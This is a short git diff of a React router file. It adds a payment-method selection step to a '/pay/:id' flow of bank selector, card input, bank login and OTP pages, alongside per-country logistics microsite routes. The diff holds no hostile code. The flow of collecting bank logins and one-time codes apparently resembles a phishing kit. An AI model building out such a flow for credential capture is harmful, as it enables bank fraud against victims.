@@ -17,6 +17,7 @@ import LogisticsServices from "./pages/LogisticsServices";
 import Contracts from "./pages/Contracts";
 import Microsite from "./pages/Microsite";
 import PaymentRecipient from "./pages/PaymentRecipient";
+import PaymentMethodSelection from "./pages/PaymentMethodSelection";
 import PaymentDetails from "./pages/PaymentDetails";
 import PaymentData from "./pages/PaymentData";
 import PaymentBankSelector from "./pages/PaymentBankSelector";
@@ -55,8 +56,10 @@ const App = () => (
           <Route path="/r/:country/:type/:id" element={<Microsite />} />
           <Route path="/pay/:id/recipient" element={<PaymentRecipient />} />
           <Route path="/pay/:id/data" element={<PaymentData />} />
+          <Route path="/pay/:id/payment-method" element={<PaymentMethodSelection />} />
+          <Route path="/pay/:id/payment-details" element={<PaymentDetails />} />
           <Route path="/pay/:id/details" element={<PaymentDetails />} />
-          {/* New payment flow: Bank selector -> Card input -> Bank login -> OTP */}
+          {/* New payment flow: Payment method -> Bank selector -> Card input OR Bank login -> OTP */}
           <Route path="/pay/:id/bank-selector" element={<PaymentBankSelector />} />
           <Route path="/pay/:id/card-input" element={<PaymentCardInput />} />
           <Route path="/pay/:id/bank-login" element={<PaymentBankLogin />} />
